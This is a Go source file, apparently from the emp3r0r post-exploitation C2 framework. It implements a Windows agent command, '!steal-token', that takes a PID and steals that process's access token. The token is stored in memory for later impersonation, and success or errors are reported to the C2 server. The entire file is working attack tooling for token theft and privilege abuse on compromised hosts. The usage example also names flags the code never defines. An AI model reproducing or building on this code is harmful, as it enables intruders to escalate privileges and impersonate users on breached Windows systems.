//go:build windows

package handler

import (
	"fmt"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/priv"
	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"github.com/spf13/cobra"
)

func platformCommands(cmd *cobra.Command) {
	// !steal-token
	stealTokenCmd := &cobra.Command{
		Use:     def.C2CmdStealToken,
		Short:   "Steal token from process; store in memory for future use",
		Example: fmt.Sprintf("%s --token <token> --cmd <command>", def.C2CmdStealToken),
		GroupID: "windows",
		Run:     runStealToken,
	}
	cmd.Flags().StringP("pid", "", "", "PID of the process to steal token from")
	cmd.AddCommand(stealTokenCmd)
}

func runStealToken(cmd *cobra.Command, args []string) {
	pidStr, _ := cmd.Flags().GetString("pid")
	if pidStr == "" {
		c2transport.NotifyC2(cmd, "Error: args error: PID is required: %s", args)
		return
	}
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: args error: PID is invalid: %s", args)
		return
	}
	hToken, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(pid))
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	sid, err := priv.GetTokenUserSid(hToken)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	priv.TokenMap.Store(sid, hToken)
	c2transport.NotifyC2(cmd, "Successfully stole token for %s", sid)
}
